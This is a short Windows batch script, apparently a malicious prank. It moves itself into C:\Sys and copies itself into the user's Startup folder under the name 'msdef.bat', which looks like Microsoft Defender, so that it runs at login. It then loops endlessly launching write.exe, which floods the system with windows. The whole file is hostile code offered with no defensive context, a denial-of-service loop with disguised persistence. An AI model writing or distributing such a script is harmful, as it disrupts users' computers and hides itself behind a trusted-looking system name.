@echo off
md C:\Sys\
move ForCH.bat C:\Sys\
copy C:\Sys\ForCH.bat %appdata%\Microsoft\Windows\Start Menu\Startup\msdef.bat
:A
start write.exe
goto a